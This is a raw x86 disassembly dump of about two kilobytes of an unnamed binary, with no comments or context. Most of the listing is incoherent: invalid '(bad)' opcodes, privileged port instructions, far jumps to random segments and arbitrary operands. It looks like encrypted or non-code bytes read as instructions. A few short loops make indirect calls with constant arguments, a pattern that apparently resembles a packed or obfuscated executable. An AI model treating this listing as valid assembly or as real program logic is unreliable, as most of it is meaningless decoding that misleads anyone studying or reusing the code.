  4128cd:	cmc    
  4128ce:	pop    es
  4128cf:	inc    eax
  4128d0:	sbb    eax,0xa2b0a5fb
  4128d5:	fild   DWORD PTR [eax]
  4128d7:	clc    
  4128d8:	leave  
  4128d9:	imul   ebp,DWORD PTR [esp+eax*1-0x791e613e],0xf21ae4dc
  4128e4:	outs   dx,DWORD PTR ds:[esi]
  4128e5:	cmp    ecx,DWORD PTR [eax]
  4128e7:	xchg   edx,edx
  4128e9:	mov    dx,0xd987
  4128ed:	cwde   
  4128ee:	dec    edx
  4128ef:	adc    bl,BYTE PTR [ecx-0x5c5af0e]
  4128f5:	inc    eax
  4128f6:	(bad)  
  4128f7:	in     al,0x3e
  4128f9:	jb     0x412934
  4128fb:	pop    ds
  4128fc:	ins    BYTE PTR es:[edi],dx
  4128fd:	imul   ebx,DWORD PTR [ecx+0x14],0xc888a4e1
  412904:	push   eax
  412905:	cmp    eax,0x8eda1f37
  41290a:	xor    al,0xa3
  41290c:	gs push es
  41290e:	imul   esi,DWORD PTR [ebp+0x1276e38],0xe2f32da5
  412918:	fstp   QWORD PTR [edi]
  41291a:	sub    BYTE PTR [ecx],bl
  41291c:	fadd   st,st(5)
  41291e:	clc    
  41291f:	mov    ds:0xeff1d6bc,al
  412924:	xor    eax,0x23bca85b
  412929:	mov    eax,ds:0x619cfc11
  41292e:	cmp    DWORD PTR [ebx],ebp
  412930:	mov    eax,0x9fa0b346
  412935:	fild   DWORD PTR [ebp-0x53]
  412938:	jns    0x4128c7
  41293a:	clc    
  41293b:	pop    ebx
  41293c:	inc    esi
  41293d:	add    al,0xa
  41293f:	in     al,dx
  412940:	sti    
  412941:	inc    esi
  412942:	popa   
  412943:	aaa    
  412944:	cld    
  412945:	jle    0x4128d7
  412947:	lea    esp,[ebp+0x6c]
  41294a:	int3   
  41294b:	arpl   WORD PTR [ebp+0x20abc951],dx
  412951:	(bad)  
  412952:	xchg   edi,eax
  412953:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412954:	push   ss
  412955:	gs (bad) 
  412957:	xchg   ebp,eax
  412958:	stos   DWORD PTR es:[edi],eax
  412959:	lock int3 
  41295b:	fimul  DWORD PTR [ebp-0x12]
  41295e:	idiv   cl
  412960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412961:	iret   
  412962:	jb     0x4129ad
  412964:	and    esi,edi
  412966:	mov    WORD PTR [edx-0x653758d6],cs
  41296c:	cld    
  41296d:	aas    
  41296e:	jae    0x41297d
  412970:	iret   
  412971:	ins    BYTE PTR es:[edi],dx
  412972:	xor    al,0x72
  412974:	cmp    eax,0xe4286229
  412979:	fst    DWORD PTR [eax+0x23]
  41297c:	mov    ch,0x19
  41297e:	leave  
  41297f:	or     al,0x33
  412981:	in     eax,0xd5
  412983:	xchg   esp,eax
  412984:	call   0x2e64:0xa84c0a18
  41298b:	xor    ebx,DWORD PTR [ebp+edi*1+0x494371e6]
  412992:	cmp    al,0x66
  412994:	sub    edx,DWORD PTR [ebx-0x2692ebb]
  41299a:	mov    eax,cs
  41299c:	(bad)  
  41299d:	mov    ds:0xdd30306a,eax
  4129a2:	adc    al,0xb2
  4129a4:	and    eax,0x94c7975e
  4129a9:	test   DWORD PTR [ecx-0x5384ab4a],ebp
  4129af:	std    
  4129b0:	or     al,0x9f
  4129b2:	fadd   DWORD PTR [esi-0x4]
  4129b5:	dec    eax
  4129b6:	xchg   esi,eax
  4129b7:	call   0xa8cb54c
  4129bc:	clc    
  4129bd:	pop    ss
  4129be:	xlat   BYTE PTR ds:[ebx]
  4129bf:	mov    ebp,0x23abb8bd
  4129c4:	mov    esp,0x3060a492
  4129c9:	(bad)  [ecx-0x63]
  4129cc:	imul   eax,DWORD PTR [esi],0x3eb13b51
  4129d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129d3:	cmp    eax,0x5e06e266
  4129d8:	ret    0x533d
  4129db:	jnp    0x4129c9
  4129dd:	push   ebx
  4129de:	sti    
  4129df:	add    BYTE PTR ds:0xe8d8bdf,ch
  4129e5:	push   esi
  4129e6:	dec    eax
  4129e7:	sub    DWORD PTR [esi],edx
  4129e9:	not    DWORD PTR [edx+ebx*4+0xf]
  4129ed:	jns    0x412a6d
  4129ef:	inc    edi
  4129f0:	ror    DWORD PTR [ebp+0x73],0xcf
  4129f4:	retf   
  4129f5:	aam    0xab
  4129f7:	in     al,dx
  4129f8:	mov    ds:0xa368f6b4,al
  4129fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129fe:	inc    edi
  4129ff:	add    ecx,ebp
  412a01:	clc    
  412a02:	fcmovbe st,st(2)
  412a04:	sar    DWORD PTR [eax+0x76f0fb52],1
  412a0a:	dec    ecx
  412a0b:	mov    ch,0xd3
  412a0d:	mov    esi,ecx
  412a0f:	sub    al,0x79
  412a11:	test   al,0x75
  412a13:	mov    WORD PTR [edi],gs
  412a15:	in     al,0xca
  412a17:	mov    BYTE PTR [ecx],bh
  412a19:	sahf   
  412a1a:	popf   
  412a1b:	arpl   WORD PTR [eax-0xb],bp
  412a1e:	leave  
  412a1f:	fisub  DWORD PTR [ecx]
  412a21:	cmc    
  412a22:	pop    ebp
  412a23:	mov    eax,ds:0xf4ab3a85
  412a28:	nop
  412a29:	xor    BYTE PTR [ecx-0x4e17acb6],0x34
  412a30:	sbb    al,0x66
  412a32:	in     al,0x5e
  412a34:	add    BYTE PTR [edi],0xde
  412a37:	adc    eax,0xd277dea4
  412a3c:	mov    al,0xb3
  412a3e:	rcr    ebp,0x27
  412a41:	(bad)  
  412a42:	pushf  
  412a43:	(bad)  
  412a44:	jp     0x412a14
  412a46:	neg    DWORD PTR [edi-0x6b]
  412a49:	sar    BYTE PTR [edx-0x29],0x17
  412a4d:	cdq    
  412a4e:	xchg   ebp,eax
  412a4f:	(bad)  
  412a50:	fcom   DWORD PTR ds:0x9b994083
  412a56:	(bad)  [edx-0x1598056a]
  412a5c:	mov    esp,0x4be0b9b
  412a61:	es in  eax,dx
  412a63:	xchg   edi,eax
  412a64:	out    dx,al
  412a65:	(bad)  
  412a66:	lds    esi,FWORD PTR ds:0xa581a317
  412a6c:	lods   al,BYTE PTR ds:[esi]
  412a6d:	dec    edx
  412a6e:	pop    ss
  412a6f:	add    eax,0xe01e7faa
  412a74:	ins    BYTE PTR es:[edi],dx
  412a75:	lods   eax,DWORD PTR ds:[esi]
  412a76:	mov    BYTE PTR [ebp-0x2e],0x3f
  412a7a:	xchg   edi,eax
  412a7b:	pusha  
  412a7c:	js     0x412a7b
  412a7e:	jne    0x412a6a
  412a80:	fimul  DWORD PTR [esi+0xa]
  412a83:	cs xchg edx,eax
  412a85:	lds    esi,FWORD PTR [ebp+0x51]
  412a88:	xchg   ecx,eax
  412a89:	add    ecx,ecx
  412a8b:	ja     0x412a39
  412a8d:	scas   eax,DWORD PTR es:[edi]
  412a8e:	cdq    
  412a8f:	ror    BYTE PTR [edi],cl
  412a91:	test   BYTE PTR [eax],dl
  412a93:	add    BYTE PTR [eax],al
  412a95:	add    BYTE PTR [ebx+0x3d03144d],cl
  412a9b:	mov    al,ds:0x8b0042e1
  412aa0:	or     DWORD PTR [ebx],ecx
  412aa2:	test   BYTE PTR [ecx+0x5c7e44d],0x75
  412aa9:	std    
  412aaa:	inc    edx
  412aab:	add    BYTE PTR [edi],dl
  412aad:	add    BYTE PTR [eax],al
  412aaf:	add    BYTE PTR [ebx+0x42fd753d],al
  412ab5:	add    BYTE PTR [eax],al
  412ab7:	je     0x412b09
  412abd:	cmp    DWORD PTR ds:0x42fd75,0x24
  412ac4:	jne    0x412af1
  412aca:	push   0x5fda
  412acf:	push   0x42de
  412ad4:	push   0x6b28
  412ad9:	push   0x4e0a
  412ade:	push   DWORD PTR [ebp-0x10]
  412ae1:	push   0x8dcd
  412ae6:	push   0x86d4
  412aeb:	call   DWORD PTR ds:0x42e397
  412af1:	mov    edi,DWORD PTR ds:0x42fd75
  412af7:	dec    edi
  412af8:	mov    DWORD PTR ds:0x42fd75,edi
  412afe:	jmp    0x412ab0
  412b03:	and    ecx,DWORD PTR ds:0x42e1a8
  412b09:	imul   edx,eax
  412b0c:	mov    ecx,0x4573
  412b11:	add    DWORD PTR ds:0x42e198,edx
  412b17:	add    edx,ecx
  412b19:	mov    esi,0x7879
  412b1e:	sub    edi,0x22a0
  412b24:	mov    edi,0x1556
  412b29:	jmp    0x412e0d
  412b2e:	retf   
  412b2f:	sbb    eax,eax
  412b31:	inc    esp
  412b32:	loopne 0x412ba7
  412b34:	push   ebx
  412b35:	mov    bl,0x1a
  412b37:	ror    BYTE PTR [edi],cl
  412b39:	ja     0x412ace
  412b3b:	cli    
  412b3c:	ds push ebx
  412b3e:	adc    DWORD PTR [esi+0x70],esp
  412b41:	jo     0x412afc
  412b43:	jle    0x412bb5
  412b45:	jo     0x412b10
  412b47:	fdiv   QWORD PTR ds:0x21e41a28
  412b4d:	shr    DWORD PTR [edx-0x53],1
  412b50:	sbb    esi,DWORD PTR [ebp-0x4f708100]
  412b56:	loope  0x412ae4
  412b58:	mov    edx,0x836cc5ed
  412b5d:	push   ss
  412b5e:	in     eax,0x5b
  412b60:	or     DWORD PTR [eax],0xf1393884
  412b66:	retf   0x6c5b
  412b69:	mov    al,ds:0xc8d00d29
  412b6e:	out    0x88,eax
  412b70:	test   eax,0x1f69be88
  412b75:	push   edx
  412b76:	cmp    edx,DWORD PTR ds:0x82bbd5d9
  412b7c:	push   edx
  412b7d:	push   es
  412b7e:	inc    esp
  412b7f:	call   0xc9fe62b4
  412b84:	pop    eax
  412b85:	cmp    eax,0xca454207
  412b8a:	fistp  DWORD PTR [esp+esi*2-0x7f]
  412b8e:	push   ebp
  412b8f:	or     al,0x89
  412b91:	mov    eax,ds:0xa67faa6b
  412b96:	test   eax,0x905f34be
  412b9b:	mov    esp,0x45e7dce6
  412ba0:	jge    0x412bda
  412ba2:	lods   eax,DWORD PTR ds:[esi]
  412ba3:	rol    BYTE PTR [esp+ebp*1],1
  412ba6:	pop    ebp
  412ba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ba8:	jb     0x412bc5
  412baa:	sbb    eax,0x66d1f5ba
  412baf:	lahf   
  412bb0:	cvtps2pd xmm1,xmm0
  412bb3:	js     0x412c18
  412bb5:	jo     0x412b9a
  412bb7:	push   esp
  412bb8:	repz pop edi
  412bba:	sub    esp,DWORD PTR [ebx]
  412bbc:	mov    BYTE PTR ds:0x7be69a80,ch
  412bc2:	xchg   bh,ah
  412bc4:	and    BYTE PTR [esi-0x364bcd32],0x10
  412bcb:	push   ecx
  412bcc:	pop    esp
  412bcd:	sbb    DWORD PTR [ebp-0x21],ebp
  412bd0:	adc    ebp,edi
  412bd2:	adc    al,0xca
  412bd4:	sub    al,0x3d
  412bd6:	xor    BYTE PTR [edx],0x20
  412bd9:	inc    ebx
  412bda:	inc    esi
  412bdb:	mov    ebp,0x7d2ee8af
  412be0:	in     eax,0x16
  412be2:	jmp    0x86a4:0xb236b70a
  412be9:	lods   eax,DWORD PTR ds:[esi]
  412bea:	ja     0x412c2b
  412bec:	retf   
  412bed:	xor    ebx,DWORD PTR [edi]
  412bef:	retf   
  412bf0:	(bad)  
  412bf1:	xor    edi,DWORD PTR [edx]
  412bf3:	dec    esi
  412bf4:	into   
  412bf5:	inc    edx
  412bf6:	sbb    al,0x5a
  412bf8:	dec    ecx
  412bf9:	cmp    dl,BYTE PTR [edx]
  412bfb:	bnd jp 0x412be0
  412bfe:	pop    edi
  412bff:	mov    ch,0x70
  412c01:	cmp    ch,BYTE PTR [esi+ecx*4-0x62]
  412c05:	and    edi,DWORD PTR [ebx+0x12]
  412c08:	jne    0x412bdd
  412c0a:	jp     0x412bad
  412c0c:	jle    0x412ba0
  412c0e:	sbb    al,0xac
  412c10:	adc    dl,BYTE PTR [edx+0x6b]
  412c13:	jb     0x412bff
  412c15:	js     0x412c5a
  412c17:	or     eax,0x14be178
  412c1c:	dec    ecx
  412c1d:	cwde   
  412c1e:	xlat   BYTE PTR ds:[ebx]
  412c1f:	mov    bh,0x4d
  412c21:	iret   
  412c22:	dec    esp
  412c23:	xchg   esi,eax
  412c24:	imul   edi,DWORD PTR ds:0xb4e4baac,0x7adf1e82
  412c2e:	mul    DWORD PTR [ecx-0xa804619]
  412c34:	mov    ch,0xb0
  412c36:	xchg   BYTE PTR [ecx],dl
  412c38:	add    al,0xd9
  412c3a:	stos   BYTE PTR es:[edi],al
  412c3b:	pop    edi
  412c3c:	xchg   edx,eax
  412c3d:	aaa    
  412c3e:	fsubp  st(7),st
  412c40:	jl     0x412c57
  412c42:	fisttp DWORD PTR [esp+ebp*8]
  412c45:	into   
  412c46:	retf   
  412c47:	push   ds
  412c48:	aam    0xa2
  412c4a:	aad    0xbe
  412c4c:	cmp    dl,BYTE PTR [ebp+0x1e2bfffa]
  412c52:	(bad)  
  412c53:	in     al,dx
  412c54:	sbb    DWORD PTR [ecx+0x5e345083],ecx
  412c5a:	mov    edx,DWORD PTR [ebp+0x4c]
  412c5d:	jbe    0x412bec
  412c5f:	out    dx,eax
  412c60:	jae    0x412c37
  412c62:	pop    edx
  412c63:	cmp    bh,0x59
  412c66:	xor    eax,0x2efb48b9
  412c6b:	scas   eax,DWORD PTR es:[edi]
  412c6c:	add    ah,BYTE PTR [eax+0x3bbcb979]
  412c72:	or     eax,0xaef3aea7
  412c77:	mov    al,ds:0x4fcc6368
  412c7c:	cmp    esi,DWORD PTR [eax-0x1d]
  412c7f:	mov    edi,0x39e692ec
  412c84:	nop
  412c85:	std    
  412c86:	xchg   esp,eax
  412c87:	retf   0xa5ac
  412c8a:	push   esp
  412c8b:	add    DWORD PTR [ebx],ebx
  412c8d:	pop    esp
  412c8e:	imul   edi,eax,0x75
  412c91:	adc    DWORD PTR [ebp+0x7a62f2c0],esp
  412c97:	int3   
  412c98:	pop    ds
  412c99:	test   BYTE PTR [ebp-0x50],al
  412c9c:	mov    al,ds:0xcd6466ab
  412ca1:	mov    ecx,0x90b2cb52
  412ca6:	jmp    0x5c4d:0xfb293684
  412cad:	xchg   ebx,eax
  412cae:	jecxz  0x412ce1
  412cb0:	shr    esi,0x53
  412cb3:	rol    ecx,0x27
  412cb6:	or     BYTE PTR [ebx],dl
  412cb8:	add    al,0x28
  412cba:	mov    ah,0xa7
  412cbc:	int3   
  412cbd:	jl     0x412c8c
  412cbf:	mov    ah,0xa1
  412cc1:	jg     0x412d28
  412cc3:	add    DWORD PTR [ebp+0x49],eax
  412cc6:	sub    bh,BYTE PTR [edx+0x74e661c1]
  412ccc:	cs jmp 0x3107:0x906fde02
  412cd4:	je     0x412d12
  412cd6:	xlat   BYTE PTR ds:[ebx]
  412cd7:	xchg   ch,bh
  412cd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412cda:	imul   ecx,DWORD PTR [esi+0x3d],0x78
  412cde:	out    dx,al
  412cdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ce0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ce1:	cmp    DWORD PTR [edi+eiz*8+0x40],esi
  412ce5:	mov    dh,BYTE PTR [ebp+0x278a6100]
  412ceb:	shl    BYTE PTR [ecx+0x2f],1
  412cee:	icebp  
  412cef:	aaa    
  412cf0:	sbb    DWORD PTR [ebp+0x77ebf73d],edx
  412cf6:	cmp    edi,DWORD PTR [esi]
  412cf8:	sbb    DWORD PTR [edi+eax*8-0x543dd5fa],ebp
  412cff:	xchg   edx,eax
  412d00:	mov    esp,0x76f55ce4
  412d05:	dec    eax
  412d06:	outs   dx,DWORD PTR ds:[esi]
  412d07:	inc    ebx
  412d08:	dec    ecx
  412d09:	inc    ebp
  412d0a:	nop
  412d0b:	sbb    ecx,DWORD PTR [ebx+eiz*1]
  412d0e:	adc    BYTE PTR [edi+edx*1+0x3f],cl
  412d12:	xor    al,0x23
  412d14:	out    dx,eax
  412d15:	mov    esp,0x708e62d4
  412d1a:	and    al,0xc1
  412d1c:	pop    eax
  412d1d:	sbb    esi,esi
  412d1f:	dec    esp
  412d20:	int3   
  412d21:	add    DWORD PTR [esi],ecx
  412d23:	pop    ebp
  412d24:	sti    
  412d25:	xlat   BYTE PTR ds:[ebx]
  412d26:	jne    0x412cb9
  412d28:	and    eax,DWORD PTR [ebx]
  412d2a:	cmp    eax,0x4c90e36a
  412d2f:	sbb    dl,bh
  412d31:	fs (bad) 
  412d33:	push   ds
  412d34:	jecxz  0x412d4c
  412d36:	es cli 
  412d38:	gs into 
  412d3a:	push   ss
  412d3b:	cmp    DWORD PTR ds:0x72da8188,ebp
  412d41:	push   ebp
  412d42:	mov    ds:0xf3aa0929,eax
  412d47:	or     al,0x96
  412d49:	lock mov esp,0xfed55a04
  412d4f:	mul    BYTE PTR [esi+0x17e392fe]
  412d55:	test   al,0x8d
  412d57:	les    edi,FWORD PTR [esp+ecx*8-0x4615171e]
  412d5e:	inc    edi
  412d5f:	fiadd  DWORD PTR [esi+esi*2+0x79b9081a]
  412d66:	inc    ecx
  412d67:	shl    DWORD PTR [ecx+0x3ecc0923],cl
  412d6d:	pop    ebp
  412d6e:	repz fidivr DWORD PTR [ebp+0x59ab639b]
  412d75:	and    DWORD PTR [ebp+0x3282c901],ecx
  412d7b:	xchg   esp,eax
  412d7c:	sub    esp,ecx
  412d7e:	add    esp,esp
  412d80:	out    0xbf,eax
  412d82:	or     ebx,esp
  412d84:	lods   al,BYTE PTR ds:[esi]
  412d85:	xchg   DWORD PTR [edi+edi*1-0x3e],esp
  412d89:	(bad)  
  412d8b:	jmp    0x412de1
  412d8d:	push   esi
  412d8e:	mov    WORD PTR [edx-0x33f93a0b],?
  412d94:	int    0x9e
  412d96:	push   ecx
  412d97:	jecxz  0x412e10
  412d99:	rcl    dl,cl
  412d9b:	adc    eax,0x8f29853d
  412da0:	pop    edx
  412da1:	ja     0xfdb262d3
  412da7:	mov    ds:0x44a93897,al
  412dac:	or     eax,0xb0daaa09
  412db1:	das    
  412db2:	mov    ?,WORD PTR [esi-0x1433b0f8]
  412db8:	(bad)  
  412db9:	push   0xb8b4acf4
  412dbe:	and    ebp,DWORD PTR [ebx+0x6f]
  412dc1:	cwde   
  412dc2:	sub    edi,DWORD PTR [eax+0x33c723b6]
  412dc8:	out    0xcd,eax
  412dca:	xchg   esp,eax
  412dcb:	lods   eax,DWORD PTR ds:[esi]
  412dcc:	and    BYTE PTR [edx],ch
  412dce:	fidivr DWORD PTR [ebx]
  412dd0:	out    0xbc,al
  412dd2:	test   eax,0x19e2d1b4
  412dd7:	mov    al,ds:0x181211b5
  412ddc:	push   es
  412ddd:	jnp    0x412e15
  412ddf:	call   0xbf47:0x89ba77ff
  412de6:	in     al,dx
  412de7:	jle    0x412ddb
  412de9:	icebp  
  412dea:	inc    ebx
  412deb:	mov    esi,0x225bf87e
  412df0:	cwde   
  412df1:	or     al,0x60
  412df3:	xor    cl,dl
  412df5:	add    DWORD PTR [edi-0x2070e00e],esp
  412dfb:	sub    bh,ah
  412dfd:	mov    ah,0xef
  412dff:	push   0x10bbfa08
  412e04:	fstp   QWORD PTR [edx]
  412e06:	stos   DWORD PTR es:[edi],eax
  412e07:	mov    dl,0x40
  412e09:	mov    BYTE PTR [ecx+0x5e],dh
  412e0c:	inc    BYTE PTR [edi-0x63da7e32]
  412e12:	loope  0x412e56
  412e14:	add    BYTE PTR [eax],al
  412e16:	add    BYTE PTR [eax],al
  412e18:	add    cl,ch
  412e1a:	sldt   WORD PTR [eax]
  412e1d:	add    BYTE PTR [ebx],dh
  412e1f:	leave  
  412e20:	add    ecx,DWORD PTR ds:0x42e19c
  412e26:	inc    ecx
  412e27:	mov    DWORD PTR ds:0x42e19c,ecx
  412e2d:	cmp    DWORD PTR ds:0x42e19c,0x17
  412e34:	jae    0x412e60
  412e3a:	cmp    DWORD PTR ds:0x42e19c,0x25
  412e41:	jne    0x412e55
  412e47:	push   0x286f
  412e4c:	push   DWORD PTR [ebp-0x18]
  412e4f:	call   DWORD PTR ds:0x42e507
  412e55:	jmp    0x412e1e
  412e5a:	xor    ecx,0x7ba7
  412e60:	sub    edx,edi
  412e62:	xor    esi,esi
  412e64:	jmp    0x413148
  412e69:	call   0x6aab08c6
  412e6e:	jno    0x412ee7
  412e70:	popa   
  412e71:	push   ebx
  412e72:	xchg   eax,esp
  412e74:	arpl   WORD PTR ds:0x5ad3842c,bx
  412e7a:	fs jo  0x412eed
  412e7d:	mov    ecx,0xee70707e
  412e82:	cli    
  412e83:	sahf   
  412e84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e85:	std    
  412e86:	or     ah,ah
  412e88:	mov    BYTE PTR [edi-0x456f9b93],bh
  412e8e:	and    DWORD PTR [ebp+0x7a],ecx
  412e91:	pop    ss
  412e92:	test   eax,ecx
  412e94:	nop
  412e95:	xchg   esi,eax
  412e96:	loope  0x412e71
  412e98:	and    al,0xe2
  412e9a:	mov    dh,0x64
  412e9c:	xchg   ebx,eax
  412e9d:	outs   dx,DWORD PTR ds:[esi]
  412e9e:	fsubp  st(4),st
  412ea0:	lea    ebx,[ecx-0x15]
  412ea3:	add    ecx,DWORD PTR [edi+eax*4+0x25]
  412ea7:	mov    al,0x6
  412ea9:	xor    esi,DWORD PTR [edi]
  412eab:	mov    ebx,0xaac969ef
  412eb0:	sysexit 
  412eb2:	js     0x412f29
  412eb4:	push   ebp
  412eb5:	add    al,BYTE PTR [ebp-0x72]
  412eb8:	jno    0x412e86
  412eba:	lea    ebx,[edi-0x74d151eb]
  412ec0:	pop    ds
  412ec1:	lds    eax,FWORD PTR [ebp+0x67419bba]
  412ec7:	pop    eax
  412ec8:	adc    DWORD PTR [edx+eiz*8+0xf],ebx
  412ecc:	out    0x1a,al
  412ece:	cdq    
  412ecf:	mov    edx,0x2eddd7ba
  412ed4:	sbb    BYTE PTR [edx*8-0x20bb5ef0],ch
  412edb:	or     DWORD PTR [edx+0x1521cfc6],eax
  412ee1:	add    al,0x7
  412ee3:	(bad)  
  412ee4:	sub    ecx,ebx
  412ee6:	aad    0x75
  412ee8:	(bad)  
  412ee9:	mov    ch,0x73
  412eeb:	dec    ebx
  412eec:	xor    eax,0x678232ab
  412ef1:	cmp    DWORD PTR [ebx-0x3209ee41],edx
  412ef7:	(bad)  
  412ef9:	data16 jo 0x412f51
  412efc:	sbb    DWORD PTR [eax],ebp
  412efe:	test   BYTE PTR [ebx-0x2e],0x1f
  412f02:	fmul   DWORD PTR [edi-0x28]
  412f05:	les    eax,FWORD PTR [edi+0x21]
  412f08:	mov    BYTE PTR [edi],ch
  412f0a:	dec    esi
  412f0b:	pop    ecx
  412f0c:	and    bl,BYTE PTR [eax+0x44]
  412f0f:	popa   
  412f10:	in     al,0x0
  412f12:	stos   DWORD PTR es:[edi],eax
  412f13:	pop    eax
  412f14:	mov    eax,ss
  412f16:	push   ecx
  412f17:	daa    
  412f18:	cmp    ebx,edx
  412f1a:	xor    BYTE PTR [edx+0x37a4c3dc],0x3d
  412f21:	mov    eax,ds:0x1096fad7
  412f26:	and    al,0x0
  412f28:	adc    al,0x77
  412f2a:	mov    esi,DWORD PTR [eax+ebx*1-0x6396e9df]
  412f31:	jle    0x412f8d
  412f33:	or     eax,esp
  412f35:	test   eax,0xa9433a38
  412f3a:	retf   
  412f3b:	cmp    al,0x61
  412f3d:	mov    ah,0xa6
  412f3f:	fmul   QWORD PTR [ebx]
  412f41:	hlt    
  412f42:	test   al,0x78
  412f44:	cld    
  412f45:	dec    esi
  412f46:	xor    dl,BYTE PTR [edx]
  412f48:	and    BYTE PTR ds:0x4389c772,al
  412f4e:	out    dx,eax
  412f4f:	nop
  412f50:	inc    BYTE PTR [ebx]
  412f52:	push   ebp
  412f53:	add    al,0x77
  412f55:	clc    
  412f56:	lea    ebx,[ecx]
  412f58:	aam    0xf2
  412f5a:	push   edi
  412f5b:	push   0xb12c5086
  412f60:	pop    esi
  412f61:	in     al,dx
  412f62:	add    BYTE PTR [edi-0x2cda35c0],ah
  412f68:	adc    al,0x97
  412f6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f6b:	cmc    
  412f6c:	fadd   DWORD PTR [ebx+0x48]
  412f6f:	mov    eax,ds:0x37f8614b
  412f74:	mov    ds:0xea7c5cd,al
  412f79:	pop    ebx
  412f7a:	cmp    eax,0x5a8ced0c
  412f7f:	mov    al,0x44
  412f81:	cs into 
  412f83:	xchg   esi,eax
  412f84:	xor    al,0x56
  412f86:	sahf   
  412f87:	fst    st(5)
  412f89:	inc    esp
  412f8a:	pusha  
  412f8b:	aas    
  412f8c:	add    BYTE PTR [ebp-0x2d],al
  412f8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f90:	js     0x412f55
  412f92:	cmc    
  412f93:	loop   0x412fb2
  412f95:	or     dh,BYTE PTR [ebp+0x79]
  412f98:	lods   eax,DWORD PTR ds:[esi]
  412f99:	dec    esi
  412f9a:	or     edx,DWORD PTR [ebx+0x124192d]
  412fa0:	dec    ecx
  412fa1:	mov    al,ds:0xd85ae9e9
  412fa6:	fmul   st,st(7)
  412fa8:	test   eax,0xf8cc59e6
  412fad:	fs xor esp,ecx
  412fb0:	jnp    0x412fc4
  412fb2:	push   edi
  412fb3:	jns    0x412fc7
  412fb5:	dec    DWORD PTR [edx-0x32ec19fe]
  412fbb:	xor    bh,BYTE PTR [edx+0x556b199d]
  412fc1:	fsub   st(5),st
  412fc3:	add    esi,DWORD PTR [ecx+0xb]
  412fc6:	inc    edi
  412fc7:	push   esi
  412fc8:	inc    ecx
  412fc9:	mov    eax,0x318cd8f6
  412fce:	out    0xef,al
  412fd0:	aaa    
  412fd1:	jae    0x412f8a
  412fd3:	or     al,0x38
  412fd5:	outs   dx,BYTE PTR ds:[esi]
  412fd6:	in     eax,0x9a
  412fd8:	popf   
  412fd9:	cmp    BYTE PTR [ebp-0x10],al
  412fdc:	jmp    0x412f5f
  412fde:	xchg   cl,dh
  412fe0:	dec    esp
  412fe1:	sub    BYTE PTR [eax-0x3010d1b9],ah
  412fe7:	test   eax,0x7a480c82
  412fec:	pop    edi
  412fed:	inc    eax
  412fee:	mov    ebp,0x651790d7
  412ff3:	adc    dh,BYTE PTR [edx-0x2f]
  412ff6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ff7:	adc    DWORD PTR gs:[ebx-0x60],edi
  412ffb:	inc    eax
  412ffc:	xor    eax,DWORD PTR [ebx+0x74]
  412fff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413000:	xor    ah,cl
  413002:	mov    ds:0xe7d7c546,al
  413007:	hlt    
  413008:	bound  esp,QWORD PTR [ebx]
  41300a:	dec    ebx
  41300b:	mov    eax,ds:0x34d86ce0
  413010:	xlat   BYTE PTR ds:[ebx]
  413011:	sbb    BYTE PTR [edi],0x66
  413014:	popa   
  413015:	jl     0x413044
  413017:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413018:	mov    eax,0x214d3461
  41301d:	fwait
  41301e:	mov    eax,ds:0xd47808e3
  413023:	xchg   edx,eax
  413024:	lahf   
  413025:	sub    ebp,edi
  413027:	out    dx,al
  413028:	xchg   edx,eax
  413029:	das    
  41302a:	test   al,0x2e
  41302c:	leave  
  41302d:	mov    edi,0x1484a920
  413032:	pop    es
  413033:	jnp    0x41306a
  413035:	inc    ecx
  413036:	sbb    al,BYTE PTR [ecx+0x7bf6b86a]
  41303c:	popa   
  41303d:	xor    esi,DWORD PTR [eax-0x32]
  413040:	fiadd  DWORD PTR ds:0x6f4a1ad7
  413046:	lahf   
  413047:	test   BYTE PTR [esi-0x4b73a47],0x40
  41304e:	xchg   ebx,eax
  41304f:	jle    0x41303c
  413051:	out    dx,eax
  413052:	or     DWORD PTR [edi+0x556b0d99],edx
  413058:	outs   dx,BYTE PTR ds:[esi]
  413059:	push   edi
  41305a:	sbb    al,0x6f
  41305c:	dec    esi
  41305d:	out    0xae,al
  41305f:	cli    
  413060:	pop    ebx
  413061:	sub    BYTE PTR [ebp-0x55],al
  413064:	cwde   
  413065:	sbb    BYTE PTR fs:[edi+eiz*2+0x7d],dl
  41306a:	leave  
  41306b:	call   0xdda360e2
  413070:	jns    0x413047
  413072:	xor    BYTE PTR [edx],dl
  413074:	xchg   ebp,eax
  413075:	jle    0x41306e
  413077:	adc    BYTE PTR [edx],dl
  413079:	pop    es
  41307a:	call   0xdadc:0x51989698
  413081:	aas    
  413082:	(bad)  
  413083:	xchg   ebp,eax
  413084:	xor    edi,DWORD PTR [ebp+0x13]
  413087:	lods   al,BYTE PTR ds:[esi]
  413088:	icebp  
  413089:	not    DWORD PTR [eax-0x7f]
  41308c:	pop    ss
  41308d:	mov    eax,0xe4f87970
  413092:	mov    fs,WORD PTR [esi+0x10]
  413095:	jb     0x413068
  413097:	fmul   st(6),st
  413099:	inc    ebx
  41309a:	xchg   ebp,eax
  41309b:	int3   
  41309c:	mov    cl,0x65
  41309e:	sbb    DWORD PTR [esi+0x6475a47e],0xfc12c847
  4130a8:	mov    ch,BYTE PTR [esi-0x56]
  4130ab:	and    DWORD PTR [edx-0x23],edx
  4130ae:	test   eax,0x2d62f43c
  4130b3:	mul    DWORD PTR ds:0x99cb5ec5
  4130b9:	push   0x1c
  4130bb:	xor    al,0x8b
  4130bd:	(bad)  
  4130be:	and    dh,ah
  4130c0:	push   ss
  4130c1:	pop    ebp
  4130c2:	or     BYTE PTR [eax+0x21a8b25a],bl
  4130c8:	mov    ds:0x37d82076,eax
  4130cd:	bound  edi,QWORD PTR [eax]
  4130cf:	cmp    esp,esi
  4130d1:	dec    edi
  4130d2:	sub    eax,0x2bd88a5c
